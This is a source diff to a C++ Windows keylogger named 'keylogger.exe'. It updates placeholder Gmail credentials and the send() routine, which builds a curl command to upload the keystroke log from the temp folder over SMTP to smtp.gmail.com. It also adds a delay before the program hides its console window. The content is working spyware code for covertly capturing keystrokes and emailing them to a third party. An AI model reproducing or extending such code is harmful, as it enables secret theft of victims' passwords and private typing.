@@ -14,9 +14,9 @@
 //U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
 const std::string exe_name = "keylogger.exe";
 const std::string LogFileName = "data.th";
-const std::string EmailFrom = "YourEmail@gmail.com";
-const std::string EmailFromPassword = "YourPassword";
-const std::string EmailTo = "DataReciever@gmail.com";
+const std::string EmailFrom = "example@gmail.com";
+const std::string EmailFromPassword = "YourPassowrd";
+const std::string EmailTo = "example@gmail.com";
 
 
 
@@ -32,11 +32,12 @@ using namespace std;
 
 
 void send() {
-	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"";
+	string cmd = "curl.exe smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"";
 	cmd += EmailFrom;
 	cmd += "\\\" --mail-rcpt \\\"";
 	cmd += EmailTo;
 	cmd += "\\\" --ssl --upload-file ";
+	cmd += "%temp%\\";
 	cmd += LogFileName;
 	cmd += " -u ";
 	cmd += EmailFrom;
@@ -182,7 +183,7 @@ bool SpecialKeys(int S_Key) {
 
 int main()
 {
-
+	Sleep(500);
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	fstream LogFile;
 	LogFile.open(LogFileName, fstream::app);
